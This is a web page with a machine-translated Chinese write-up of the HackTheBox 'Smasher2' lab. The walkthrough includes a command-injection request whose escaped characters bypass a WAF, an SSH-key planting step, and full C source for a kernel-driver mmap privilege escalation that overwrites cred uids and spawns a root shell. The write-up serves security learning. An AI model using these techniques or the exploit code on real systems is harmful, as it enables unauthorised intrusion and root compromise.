<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👰🏿 🤱🏽 🦂 哈克盒子-Smasher2演练 通过pwn驱动程序进行Flask，WAF和LPE 😭 🧑 ⛷️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="在本文中，我将开始发布从HackTheBox网站发送的用于进一步处理的解决方案。 我希望这将至少帮助某人在信息安全领域发展。 在本文中，我们将反转python库，绕过WAF并利用mmap漏洞。 

 通过VPN连接到实验室。 建议不要从可用对您重要的数据的工作计算机或主机进行连接，因为您最终将与与信...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>哈克盒子-Smasher2演练 通过pwn驱动程序进行Flask，WAF和LPE</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/480454/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/ms/yw/0j/msyw0jxgua25iuntaxj1qcayfuq.png" alt="图片"></div><br> 在本文中，我将开始发布从<a href="https://www.hackthebox.eu/" rel="nofollow">HackTheBox</a>网站发送的用于<a href="https://www.hackthebox.eu/" rel="nofollow">进一步处理的</a>解决方案。 我希望这将至少帮助某人在信息安全领域发展。 在本文中，我们将反转python库，绕过WAF并利用mmap漏洞。 <br><br> 通过VPN连接到实验室。 建议不要从可用对您重要的数据的工作计算机或主机进行连接，因为您最终将与与信息安全领域有了解的人建立私有网络：) <br><br><div class="spoiler">  <b class="spoiler_title">组织信息</b> <div class="spoiler_text"> 特别是对于那些想要学习新知识并在信息和计算机安全性的任何领域中发展的人们，我将撰写和讨论以下类别： <br><br><ul><li>  PWN； </li><li> 密码学（加密）； </li><li> 网络技术（网络）； </li><li> 反向（反向工程）； </li><li> 隐写术（Stegano）； </li><li> 搜索和利用Web漏洞。 </li></ul><br> 除此之外，我还将分享我在计算机取证，恶意软件和固件分析，对无线网络和局域网的攻击，进行笔测试和编写漏洞利用程序方面的经验。 <br><a name="habracut"></a><br> 为了使您可以查找有关新文章，软件和其他信息的信息，我<a href="https://t.me/RalfHackerChannel" rel="nofollow">在Telegram中</a>创建了一个<a href="https://t.me/RalfHackerChannel" rel="nofollow">频道，</a>并创建了一个<a href="https://t.me/RalfHackerPublicChat" rel="nofollow">小组来讨论</a> ICD领域的<a href="https://t.me/RalfHackerPublicChat" rel="nofollow">所有问题</a> 。 另外，我会亲自考虑您的个人要求，问题，建议和建议， <a href="https://t.me/hackerralf8" rel="nofollow">并会回答所有人</a> 。 <br><br> 提供所有信息仅出于教育目的。 对于由于使用本文档而获得的知识和方法对某人造成的任何损害，本文档的作者不承担任何责任。 <br></div></div><br><h2> 智商 </h2><br><h3> 端口扫描 </h3><br> 这台机器的IP地址为10.10.10.135，我将其添加到/ etc / hosts中。 <br> <code>10.10.10.135 smasher2.htb</code> <br> 首先，我们扫描开放端口。 由于使用nmap扫描所有端口需要很长时间，因此我将首先使用masscan进行此操作。 我们以每秒1000个数据包的速度扫描来自tun0接口的所有TCP和UDP端口。 <br><br><pre> <code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.135 --rate=1000</code> </pre> <br><img src="https://habrastorage.org/webt/ua/l0/kl/ual0klllexxrrkhyehygavfrji8.png" alt="图片"><br><br> 主机有3个开放的端口。 现在使用nmap扫描它以获得更多详细信息。 <br><br><pre> <code class="bash hljs">nmap -A 10.10.10.135 -p22,53,80</code> </pre> <br><img src="https://habrastorage.org/webt/rv/21/y3/rv21y3ntl_dol3qnlgvdhvshdhg.png" alt="图片"><br><br> 因此，我们有SSH，DNS和WEB，它们返回403代码（禁止访问被拒绝）。 <br><br><h3> 域名解析 </h3><br> 让我们检查DNS。 为此，请使用带有-l选项的主机客户端，以使用AXFR请求查看域中所有主机的列表。 <br><br><pre> <code class="bash hljs">host -l smasher2.htb 10.10.10.135</code> </pre> <br><img src="https://habrastorage.org/webt/3q/st/te/3qstteuzgycf6fxuc_7vxit1rfe.png" alt="图片"><br><br> 因此，您需要在/ etc / hosts中添加一个新条目。 <br> <code>10.10.10.135 wonderfulsessionmanager.smasher2.htb</code> <br> <br><h3> 网页 </h3><br> 现在，让我们继续前进，看看访问smasher2.htb时WEB会给我们带来什么。 <br><br><img src="https://habrastorage.org/webt/9-/li/n5/9-lin58jouqm966oevnsoccso1a.png" alt="图片"><br><br> 是空的 在这种情况下，您应该整理目录。 我正在使用golang编写的快速gobuster。 我们将整理128个线程中的目录，我们将对html，php，txt，conf扩展名和响应代码200、204、301、302、307、401感兴趣。 <br><br><pre> <code class="bash hljs">gobuster dir -t 128 -u http://smasher2.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,conf -s 200,204,301,302,307,401</code> </pre><br><img src="https://habrastorage.org/webt/iw/du/g9/iwdug9gy9ukr37s9nn4-c7pqojk.png" alt="图片"><br><br> 查找备份目录。 我们看看里面有什么。 <br><br><img src="https://habrastorage.org/webt/id/lj/zz/idljzzfub_qbnzzwu2x1lic2l38.png" alt="图片"><br><br> 因此，请下载python文件和库。 接下来，转到另一个域名，然后在其中找到授权表。 <br><br><img src="https://habrastorage.org/webt/mu/n0/mp/mun0mpgaqduxfzmhxifnqbq6_gg.png" alt="图片"><br><br>  Mozilla Firefox Wappalyzer插件报告正在使用的技术。 因此，该网站是用python 2.7.15编写的。 <br><br><img src="https://habrastorage.org/webt/ze/h9/ze/zeh9zeby2o839yeim2osz0-w__i.png" alt="图片"><br><br><h2>  WEB API </h2><br><h3> 巨蟒 </h3><br> 我们刚刚找到了auth.py文件，让我们对其进行分析。 在导入的第一行中，我们转到ses.so模块，我们也在备份中找到了该模块。 <br><br><img src="https://habrastorage.org/webt/8-/ap/rm/8-aprmznzxtkkd04fzy9wzzrchk.png" alt="图片"><br><br> 我们在代码中找到身份验证。 如果验证成功，我们将返回secret_token_info。 <br><br><img src="https://habrastorage.org/webt/vn/er/sa/vnersai2zkkcopwujarn-9abz8i.png" alt="图片"><br><br><img src="https://habrastorage.org/webt/j2/yp/3e/j2yp3emp8fwuj4xbshedsf7bou0.png" alt="图片"><br><br> 让我们转到“ / api // job”。 数据通过POST方法接收，但它们必须为JSON格式。 如果数据中存在schedule参数，它将作为命令行中的命令传递给执行。 <br><br><img src="https://habrastorage.org/webt/x7/oh/fs/x7ohfsjrcxhr8-tuwqdtcsnjxq8.png" alt="图片"><br><br> 登录名和密码已被编辑...它们被转移到我们的库中，该库创建一个会话-SessionManager对象。 <br><br><img src="https://habrastorage.org/webt/uq/p4/2e/uqp42eqln2alvsfnpwyvjbe5c_q.png" alt="图片"><br><br> 由于before_request，每次新调用都会调用safe_init_manager（id）函数。 因此，新的会话被初始化。 <br><br><img src="https://habrastorage.org/webt/95/wv/yu/95wvyudl1crmjq5nv-bq-li7gze.png" alt="图片"><br><br>  login（）函数创建一个与会话相关的管理器对象。 <br><br><img src="https://habrastorage.org/webt/zi/0t/uh/zi0tuhqdy8ewibq3purmsr6u5_e.png" alt="图片"><br><br> 然后通过check_login（）方法执行检查。 <br><br><img src="https://habrastorage.org/webt/u8/xt/_v/u8xt_vgcczwhkl4cbqlzov7tsio.png" alt="图片"><br><br><h3> 反向.so </h3><br> 因此，我们需要找出如何检查数据。 为此，在库中我们需要了解SessionManager.check_login（）设备。 投入IDA Pro，寻找所需的功能。 <br><br><img src="https://habrastorage.org/webt/ui/--/y0/ui--y0og5qsjhymyhpozz6kux0u.png" alt="图片"><br><br> 打开功能，我提请注意它的图形。 在融合之前，我对许多较低的块感兴趣。 <br><br><img src="https://habrastorage.org/webt/89/1o/7r/891o7r5jjpip6zh2uqba7xzbgrs.png" alt="图片"><br><br> 浏览这些块，您可以看到函数执行的这个或那个分支在谈论什么。 因此，我们只需要最右边的块。 <br><br><img src="https://habrastorage.org/webt/ve/xq/da/vexqdaz61fubdsfteffkqdx0ngi.png" alt="图片"><br><br> 我已经画出了我们感兴趣的功能的行为界限。 <br><br><img src="https://habrastorage.org/webt/9c/k9/ao/9ck9aomluu0wemswvub1salylas.png" alt="图片"><br><br> 现在，让我们过去看看会发生什么。 在一个地方，我注意到一个相同的登录名和密码代码。 而且比较也一样。 <br><br><img src="https://habrastorage.org/webt/65/fs/cd/65fscdprft3krxphyiwtbxdq_vg.png" alt="图片"><br><br> 此外，登录名和密码调用相同的功能。 <br><br><img src="https://habrastorage.org/webt/jo/um/w3/joumw3woscffqrof2lnjlyajdqs.png" alt="图片"><br><br> 这表明用户名和密码相同。 但是由于此值是python程序中的值，并且已经过编辑，因此它仅用于排序。 我尝试使用标准名称，令我惊讶的是，管理员出现了（为什么我不立即尝试...）。 <br><br><img src="https://habrastorage.org/webt/xp/9n/at/xp9natep2ikm8wlduicpijksqug.png" alt="图片"><br><br><h2> 入口点 </h2><br> 我们有一把钥匙。 现在，您需要收集执行代码的请求。 如前所述，我们必须以JSON格式将包含schedule参数的POST方法数据发送到<a href="http://wonderfulsessionmanager.smasher2.htb/auth/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job" rel="nofollow">wonderfulsessionmanager.smasher2.htb / auth / fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8 / job</a> 。 我们使用curl进行此操作，并将结果传递给jq。 我们将执行whoami命令。 <br><br><pre> <code class="bash hljs">curl -s -H <span class="hljs-string"><span class="hljs-string">"Cookie: session=eyJpZCI6eyIgYiI6Ik5UaGlZVEJrTmpBMk1qYzBNemN4TmprellUTm1NREV3TXprMk9USTRPV1UzTnpVd05EQXdZZz09In19.XfZcLA.R3UTUnieAARkHBTbqpTmofKWtBw"</span></span> -H <span class="hljs-string"><span class="hljs-string">"Content-Type: application/json"</span></span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="hljs-string"><span class="hljs-string">'{"schedule":"whoami"}'</span></span> | jq</code> </pre> <br><img src="https://habrastorage.org/webt/-s/u0/er/-su0erve1bo3frizq-_qmtlyclq.png" alt="图片"><br><br> 但是，当尝试执行“ ls”命令时，会出现错误。 <br><br><img src="https://habrastorage.org/webt/sz/c7/pk/szc7pkucef1xd5errhnrw01ydas.png" alt="图片"><br><br> 最有可能在团队中有一个筛选器。 让我们成功发送“ l \\ s”-表示存在过滤器。 <br><br><img src="https://habrastorage.org/webt/bx/vl/wy/bxvlwyxbspsgt_bsucpjk8gkdda.png" alt="图片"><br><br><h2> 用户名 </h2><br> 现在我们需要在系统中获得一个普通的外壳。 系统运行SSH，因此我们可以生成密钥并将其推送到授权主机列表中。 <br><br> 首先，我们生成一个密钥。 <br><br><img src="https://habrastorage.org/webt/75/nx/-m/75nx-mr9ckmrkoyiwer3tte6qbm.png" alt="图片"><br><br> 现在，我们需要将公钥传输到文件/home/dzonerzy/.ssh/authorized_keys。 但是为了使其易于传输，我们将在base64中使用其编码。 <br><br><pre> <code class="bash hljs">base64 -w0 id_rsa.pub</code> </pre> <br> 我们首先将其传输到一个临时文件。 <br><br><pre> <code class="bash hljs">ec\\ho \”=\” &gt; /tmp/ralf</code> </pre> <br> 现在按预期进行解码和写入。 <br><pre> <code class="bash hljs">ba\\se\\64 -\\d /tmp/ralf &gt;&gt; /home/dzonerzy/\\.\\ss\\h/auth\\orized_ke\\ys</code> </pre> <br> 我们记下了密钥，现在一切正常，我们可以使用私钥通过SSH连接。 我们尝试。 我们在系统中。 <br><br><img src="https://habrastorage.org/webt/mf/7t/7n/mf7t7nnau3dbshpiirvblygdrhk.png" alt="图片"><br><br><h2>  LPE-根 </h2><br><h3> 上市 </h3><br> 用户令牌旁边是README文件。 阅读。 <br><br><img src="https://habrastorage.org/webt/n0/io/bi/n0iobindnitc1h69lhemnrnskmw.png" alt="图片"><br><br> 有人告诉我们，我们不应该以标准的方式思考...但是，在完成标准的枚举并且一无所获之后，我提请用户注意所在的组。 <br><br><img src="https://habrastorage.org/webt/ko/rc/9u/korc9u_5ji78nds_jgcnelql_uq.png" alt="图片"><br><br>  adm组有权访问有趣的文件。 <br><br><img src="https://habrastorage.org/webt/dp/oj/c0/dpojc0lhn1tpdzsgcp0k11vtyec.png" alt="图片"><br><br> 例如，auth.log。 它不仅反映了成功和不成功授权的事实，还反映了使用sudo命令的事实。 <br><br><pre> <code class="bash hljs">strings /var/<span class="hljs-built_in"><span class="hljs-built_in">log</span></span>/auth.log | grep sudo</code> </pre> <br><img src="https://habrastorage.org/webt/8t/a6/r7/8ta6r7a-rgji8-ruimkshuc-2to.png" alt="图片"><br><br> 一个有趣的命令代表根执行。 但是它与驱动程序连接，因此您需要确保我们遵循该路径。 <br><br><img src="https://habrastorage.org/webt/ix/1i/gx/ix1igxiggwoaugz01xkwu81ftbe.png" alt="图片"><br><br> 是的，不幸的是，一切都归司机。 <br><br><h3> 司机 </h3><br> 由于这是一个驱动程序（内核模块），因此我们将使用modinfo获得有关它的信息。 <br><br><img src="https://habrastorage.org/webt/ek/bh/1v/ekbh1vr8tpqrjysaqtkuu3ogwsk.png" alt="图片"><br><br> 据说需要驱动程序才能使用dhid设备。 看看吧。 <br><br><img src="https://habrastorage.org/webt/ck/bv/zx/ckbvzxss6iz1ughsn_lhqflutw4.png" alt="图片"><br><br> 是的 有这样的设备。 为了研究驱动程序，我将其复制并下载到IDA Pro中。 <br><br><pre> <code class="bash hljs">scp -i id_rsa dzonerzy@10.10.10.135:/lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko ./</code> </pre> <br> 很少的功能列表，对于PWN，我们对与内存配合使用的功能感兴趣。 从名称来看，它们是dev_read和dev_mmap。 <br><br><img src="https://habrastorage.org/webt/g9/k9/5s/g9k95slhxhlihqi0nhwm3ei5qxk.png" alt="图片"><br><br> 进一步谷歌搜索，我没有特别发现有关驱动程序中与阅读有关的漏洞的信息，而mmap不能说这！ 所以我去找她。 <br><br><img src="https://habrastorage.org/webt/3v/rk/7x/3vrk7xh2hcwclirw59wcdzihxxe.png" alt="图片"><br><br> 通常，驱动程序中的mmap是将设备映射到内存并按需选择页面所必需的，因为最初设备根本不使用物理内存。 <br><br> 在此代码中，唯一有趣的地方是对remap_pfn_range函数的调用，该函数允许将设备内存线性映射到用户的地址空间。 <br><blockquote>  int remap_pfn_range（struct vm_area_struct * vma，unsigned long virt_add，unsigned long pfn，unsigned long size，pgprot_t prot）;复制代码 <br><br> 显示物理地址的大小字节，从pfn为虚拟地址virt_add指定的页码开始。 与虚拟空间关联的安全位在prot中指定。 </blockquote><br> 与往常一样，我们查看以前未处理过的参数。 这些是pfn和size参数，它使我们可以显示任何数量的内存以供读写。 <br><br><h3> 利用 </h3><br> 谷歌搜索可以做什么，我被一种可能的利用方式震惊。 如果可以在内存中找到creds控件结构，则可以将用户uid更改为0。然后调用shell，这将为我们提供具有完全特权的shell。 <br><br><img src="https://habrastorage.org/webt/of/os/r5/ofosr5umezutxzuvasy8xd-_cqg.png" alt="图片"><br><br> 首先，检查我们是否可以显示大量内存。 以下代码将打开设备并显示从0x40404040地址开始的0xf0000000字节，以进行读取和写入，并可能将此反射与其他反映同一对象的进程一起使用。 <br><br><div class="spoiler">  <b class="spoiler_title">代号</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br> 编译： <code>gcc sh.c -o sh.bin</code>并转移到主机。 让我们运行它。 <br><br><img src="https://habrastorage.org/webt/vh/d2/u3/vhd2u3vjza59bcxi69drrpwoc9a.png" alt="图片"><br><br> 现在，让我们转到另一个ssh终端，查看此过程的存储卡。 <br><br><img src="https://habrastorage.org/webt/6u/mp/v4/6umpv4dzghjv0y1u2lyyy6lad7g.png" alt="图片"><br><br> 如您所见，地址相同，并贴有用于读写和共享的标签。 那是一个可行的想法。 下一步是在心中找到过程的信誉结构。 从上面的结构可以看出，标志将是我们的uid连续伤害的8个数字。 <br><br><div class="spoiler">  <b class="spoiler_title">代号</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, cred_iter: %d\n", addr, cred_iter); } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br> 因此，我们发现了19个相似的结构。 <br><br><img src="https://habrastorage.org/webt/rj/j5/pl/rjj5plsfirobcfwqzc8vss-svtc.png" alt="图片"><br><br> 现在我们需要将所有uid重写为0。重写特定结构的uid之后，我们将检查uid。 只要我们的uid等于0，我们就可以假定我们已经找到了所需过程的结构。 <br><br><div class="spoiler">  <b class="spoiler_title">代号</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/1x/62/eq/1x62eqetpojbwrrimgaguepynb4.png" alt="图片"><br><br> 现在，找到所需的结构后，将uid更改为0xffffffff并通过exec函数调用bash shell。 <br><br><div class="spoiler">  <b class="spoiler_title">代号</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur += 1; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; execl("/bin/sh","-", (char *)NULL); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/mn/zl/xq/mnzlxqz8pj4qafv_w0jznrhb0_e.png" alt="图片"><br><br> 我们扎根了。 实际上，这是一台非常复杂的机器，需要复杂的软件才能处理此版本的LPE。 <br><br> 当然，要在驱动程序中利用此漏洞非常困难，我感谢社区为我提供了有关如何获取驱动程序的提示，并分享了有关mmap中类似漏洞利用的文章。 <br><br> 我是否应该继续发布发送给进一步处理的机器的分析？ 您可以通过<a href="https://t.me/RalfHackerChannel" rel="nofollow">Telegram</a>加入我们。 让我们建立一个社区，在这个社区中，会有一些精通IT领域的人，然后我们可以在任何IT和信息安全问题上互相帮助。 </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN480454/">https://habr.com/ru/post/zh-CN480454/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN480438/index.html">12月16日至22日在莫斯科举行的数字活动</a></li>
<li><a href="../zh-CN480440/index.html">12月16日至22日在圣彼得堡举行的数字活动</a></li>
<li><a href="../zh-CN480444/index.html">Habra侦探：从24家出版物发行之日起24小时内</a></li>
<li><a href="../zh-CN480446/index.html">在Go上编写Grafana反向代理</a></li>
<li><a href="../zh-CN480452/index.html">OWASP莫斯科聚会＃9：性能记录</a></li>
<li><a href="../zh-CN480458/index.html">观看“时间的细胞”</a></li>
<li><a href="../zh-CN480462/index.html">我如何辩论O的双向链表（1）</a></li>
<li><a href="../zh-CN480466/index.html">透析仪规格：绝地之路</a></li>
<li><a href="../zh-CN480468/index.html">零担部署Tarantool Cartridge应用程序（第1部分）</a></li>
<li><a href="../zh-CN480470/index.html">在哪里担任初级开发人员</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>